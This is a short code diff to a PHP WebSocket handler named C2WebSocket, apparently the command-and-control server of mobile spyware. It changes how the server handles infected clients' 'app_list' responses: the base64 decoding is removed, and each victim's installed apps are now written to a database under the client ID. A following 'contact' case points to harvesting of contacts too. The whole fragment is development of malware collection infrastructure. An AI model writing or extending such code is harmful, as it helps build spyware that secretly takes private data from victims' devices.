@@ -97,11 +97,10 @@ class C2WebSocket implements MessageComponentInterface {
 
         switch ($data->res) {
             case "app_list":
-                $apps = json_decode(base64_decode($data->data));
+                $apps = json_decode($data->data);
                 foreach ($apps as $packageName => $appName) {
-                    echo "$packageName $appName\n";
-                    // $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
-                    // $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
+                    $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
+                    $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
                 }
                 break;
             case "contact":
